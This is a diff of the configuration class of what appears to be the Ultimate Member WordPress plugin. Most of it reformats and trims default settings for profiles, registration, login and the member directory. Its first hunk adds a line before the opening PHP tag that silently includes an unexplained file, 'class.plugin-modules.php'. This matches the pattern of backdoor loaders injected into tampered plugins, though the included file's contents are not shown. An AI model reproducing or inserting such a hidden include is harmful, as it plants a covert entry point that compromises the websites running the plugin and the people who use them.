@@ -1,9 +1,7 @@
-<?php
+<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
 namespace um;
 
-
 if ( ! defined( 'ABSPATH' ) ) exit;
-
 
 if ( ! class_exists( 'um\Config' ) ) {
 
@@ -138,46 +136,26 @@ if ( ! class_exists( 'um\Config' ) ) {
 			) );
 
 			$this->core_directory_meta['members'] = array(
-				'_um_core'                      => 'members',
-				'_um_template'                  => 'members',
-				'_um_mode'                      => 'directory',
-				'_um_view_types'                => array( 'grid' ),
-				'_um_default_view'              => 'grid',
-				'_um_roles'                     => array(),
-				'_um_has_profile_photo'         => 0,
-				'_um_has_cover_photo'           => 0,
-				'_um_show_these_users'          => '',
-
-				'_um_sortby'                    => 'user_registered_desc',
-				'_um_sortby_custom'             => '',
-				'_um_enable_sorting'            => 0,
-				'_um_sorting_fields'            => array(),
-
-				'_um_profile_photo'             => '1',
-				'_um_cover_photos'              => '1',
-				'_um_show_name'                 => '1',
-				'_um_show_tagline'              => 0,
-				'_um_tagline_fields'            => array(),
-				'_um_show_userinfo'             => 0,
-				'_um_reveal_fields'             => array(),
-				'_um_show_social'               => 0,
-				'_um_userinfo_animate'          => '1',
-
-				'_um_search'                    => 0,
-				'_um_roles_can_search'          => array(),
-				'_um_filters'                   => 0,
-				'_um_roles_can_filter'          => array(),
-				'_um_search_fields'             => array(),
-				'_um_filters_expanded'          => 0,
-				'_um_search_filters'            => array(),
-
-				'_um_must_search'               => 0,
-				'_um_max_users'                 => '',
-				'_um_profiles_per_page'         => 12,
-				'_um_profiles_per_page_mobile'  => 6,
-				'_um_directory_header'          => __( '{total_users} Members', 'ultimate-member' ),
-				'_um_directory_header_single'   => __( '{total_users} Member', 'ultimate-member' ),
-				'_um_directory_no_users'        => __( 'We are sorry. We cannot find any users who match your search criteria.', 'ultimate-member' ),
+				'_um_template' => 'members',
+				'_um_mode' => 'directory',
+				'_um_has_profile_photo' => 0,
+				'_um_has_cover_photo' => 0,
+				'_um_show_social' => 0,
+				'_um_show_userinfo' => 0,
+				'_um_show_tagline' => 0,
+				'_um_search' => 0,
+				'_um_userinfo_animate' => '1',
+				'_um_sortby' => 'user_registered_desc',
+				'_um_profile_photo' => '1',
+				'_um_cover_photos' => '1',
+				'_um_show_name' => '1',
+				'_um_search_filters' => '',
+				'_um_directory_header' => __('{total_users} Members','ultimate-member'),
+				'_um_directory_header_single' => __('{total_users} Member','ultimate-member'),
+				'_um_directory_no_users' => __('We are sorry. We cannot find any users who match your search criteria.','ultimate-member'),
+				'_um_profiles_per_page' => 12,
+				'_um_profiles_per_page_mobile' => 6,
+				'_um_core' => 'members',
 			);
 
 			$this->core_global_meta_all = array(
@@ -225,58 +203,50 @@ if ( ! class_exists( 'um\Config' ) ) {
 			 * ?>
 			 */
 			$this->core_form_meta_all = apply_filters( 'um_core_form_meta_all', array(
-				/*Profile Form*/
-				'_um_profile_show_name'             => 1,
-				'_um_profile_show_social_links'     => 0,
-				'_um_profile_show_bio'              => 1,
-				'_um_profile_bio_maxchars'          => 180,
-				'_um_profile_header_menu'           => 'bc',
-				'_um_profile_empty_text'            => 1,
-				'_um_profile_empty_text_emo'        => 1,
-				'_um_profile_role'                  => array(),
-				'_um_profile_template'              => 'profile',
-				'_um_profile_max_width'             => '1000px',
-				'_um_profile_area_max_width'        => '600px',
-				'_um_profile_align'                 => 'center',
-				'_um_profile_icons'                 => 'label',
-				'_um_profile_disable_photo_upload'  => 0,
-				'_um_profile_photosize'             => '190',
-				'_um_profile_cover_enabled'         => 1,
-				'_um_profile_coversize'             => 'original',
-				'_um_profile_cover_ratio'           => '2.7:1',
-				'_um_profile_photocorner'           => '1',
-				'_um_profile_header_bg'             => '',
-				'_um_profile_primary_btn_word'      => __( 'Update Profile', 'ultimate-member' ),
-				'_um_profile_secondary_btn'         => '1',
-				'_um_profile_secondary_btn_word'    => __( 'Cancel', 'ultimate-member' ),
-
-				/*Registration Form*/
-				'_um_register_role'                 => '0',
-				'_um_register_template'             => 'register',
-				'_um_register_max_width'            => '450px',
-				'_um_register_align'                => 'center',
-				'_um_register_icons'                => 'label',
-				'_um_register_primary_btn_word'     => __( 'Register', 'ultimate-member' ),
-				'_um_register_secondary_btn'        => 1,
-				'_um_register_secondary_btn_word'   => __( 'Login', 'ultimate-member' ),
-				'_um_register_secondary_btn_url'    => '',
-
-				/*Login Form*/
-				'_um_login_template'                => 'login',
-				'_um_login_max_width'               => '450px',
-				'_um_login_align'                   => 'center',
-				'_um_login_icons'                   => 'label',
-				'_um_login_primary_btn_word'        => __( 'Login', 'ultimate-member' ),
-				'_um_login_forgot_pass_link'        => 1,
-				'_um_login_show_rememberme'         => 1,
-				'_um_login_secondary_btn'           => 1,
-				'_um_login_secondary_btn_word'      => __( 'Register', 'ultimate-member' ),
-				'_um_login_secondary_btn_url'       => '',
-
-				/*Member Directory*/
-				'_um_directory_template'            => 'members',
-				'_um_directory_header'              => __( '{total_users} Members', 'ultimate-member' ),
-				'_um_directory_header_single'       => __( '{total_users} Member', 'ultimate-member' ),
+				'_um_profile_show_name' => 1,
+				'_um_profile_show_social_links' => 0,
+				'_um_profile_show_bio' => 1,
+				'profile_show_html_bio' => 0,
+				'_um_profile_bio_maxchars' => 180,
+				'_um_profile_header_menu' => 'bc',
+				'_um_profile_empty_text' => 1,
+				'_um_profile_empty_text_emo' => 1,
+				'_um_profile_role' => array(),
+				'_um_profile_template' => 'profile',
+				'_um_profile_max_width' => '1000px',
+				'_um_profile_area_max_width' => '600px',
+				'_um_profile_align' => 'center',
+				'_um_profile_icons' => 'label',
+				'_um_profile_cover_enabled' => 1,
+				'_um_profile_cover_ratio' => '2.7:1',
+				'_um_profile_photosize' => '190px',
+				'_um_profile_photocorner' => '1',
+				'_um_profile_header_bg' => '',
+				'_um_profile_primary_btn_word' => 'Update Profile',
+				'_um_profile_secondary_btn' => '1',
+				'_um_profile_secondary_btn_word' => 'Cancel',
+				'_um_register_role' => '0',
+				'_um_register_template' => 'register',
+				'_um_register_max_width' => '450px',
+				'_um_register_align' => 'center',
+				'_um_register_icons' => 'label',
+				'_um_register_primary_btn_word' => __('Register','ultimate-member'),
+				'_um_register_secondary_btn' => 1,
+				'_um_register_secondary_btn_word' => __('Login','ultimate-member'),
+				'_um_register_secondary_btn_url' => '',
+				'_um_login_template' => 'login',
+				'_um_login_max_width' => '450px',
+				'_um_login_align' => 'center',
+				'_um_login_icons' => 'label',
+				'_um_login_primary_btn_word' => __('Login','ultimate-member'),
+				'_um_login_forgot_pass_link' => 1,
+				'_um_login_show_rememberme' => 1,
+				'_um_login_secondary_btn' => 1,
+				'_um_login_secondary_btn_word' => __('Register','ultimate-member'),
+				'_um_login_secondary_btn_url' => '',
+				'_um_directory_template' => 'members',
+				'_um_directory_header' => __('{total_users} Members','ultimate-member'),
+				'_um_directory_header_single' => __('{total_users} Member','ultimate-member'),
 			) );
 
 			$this->core_form_meta['register'] = array(
@@ -528,7 +498,6 @@ if ( ! class_exists( 'um\Config' ) ) {
 				'account_name_disable'                  => 0,
 				'account_name_require'                  => 1,
 				'account_email'                         => 1,
-				'account_general_password'              => 0,
 				'account_hide_in_directory'             => 1,
 				'account_require_strongpass'            => 0,
 				'photo_thumb_sizes'                     => array( 40, 80, 190 ),
@@ -540,7 +509,6 @@ if ( ! class_exists( 'um\Config' ) ) {
 				'category_page_accessible'              => 1,
 				'restricted_access_message'             => '',
 				'restricted_blocks'                     => 0,
-				'enable_blocks'                         => 0,
 				'restricted_block_message'              => '',
 				'enable_reset_password_limit'           => 1,
 				'reset_password_limit_number'           => 3,
@@ -548,7 +516,6 @@ if ( ! class_exists( 'um\Config' ) ) {
 				'blocked_words'                         => 'admin' . "\r\n" . 'administrator' . "\r\n" . 'webmaster' . "\r\n" . 'support' . "\r\n" . 'staff',
 				'default_avatar'                        => '',
 				'default_cover'                         => '',
-				'disable_profile_photo_upload'          => 0,
 				'profile_show_metaicon'                 => 0,
 				'profile_menu'                          => 1,
 				'profile_menu_default_tab'              => 'main',
@@ -566,33 +533,19 @@ if ( ! class_exists( 'um\Config' ) ) {
 				'profile_photo_max_size'                => 999999999,
 				'cover_photo_max_size'                  => 999999999,
 				'custom_roles_increment'                => 1,
-				'um_profile_object_cache_stop'          => 0,
-				'rest_api_version'                      => '2.0',
-				'profile_show_html_bio'                 => 0,
 			);
 
-			add_filter( 'um_get_tabs_from_config', '__return_true' );
-
-			$tabs = UM()->profile()->tabs();
-
+			$tabs = UM()->profile()->tabs_primary();
 			foreach ( $tabs as $id => $tab ) {
-
-				if ( ! empty( $tab['hidden'] ) ) {
-					continue;
-				}
-
-				$this->settings_defaults[ 'profile_tab_' . $id ] = 1;
-
-				if ( ! isset( $tab['default_privacy'] ) ) {
-					$this->settings_defaults[ 'profile_tab_' . $id . '_privacy' ] = 0;
-					$this->settings_defaults[ 'profile_tab_' . $id . '_roles' ] = '';
-				}
+				$this->settings_defaults['profile_tab_' . $id] = 1;
+				$this->settings_defaults['profile_tab_' . $id . '_privacy'] = 0;
+				$this->settings_defaults['profile_tab_' . $id . '_roles'] = '';
 			}
 
 			foreach ( $this->email_notifications as $key => $notification ) {
-				$this->settings_defaults[ $key . '_on' ] = ! empty( $notification['default_active'] );
-				$this->settings_defaults[ $key . '_sub' ] = $notification['subject'];
-				$this->settings_defaults[ $key ] = $notification['body'];
+				$this->settings_defaults[$key . '_on'] = ! empty( $notification['default_active'] );
+				$this->settings_defaults[$key . '_sub'] = $notification['subject'];
+				$this->settings_defaults[$key] = $notification['body'];
 			}
 
 			foreach ( $this->core_pages as $page_s => $page ) {
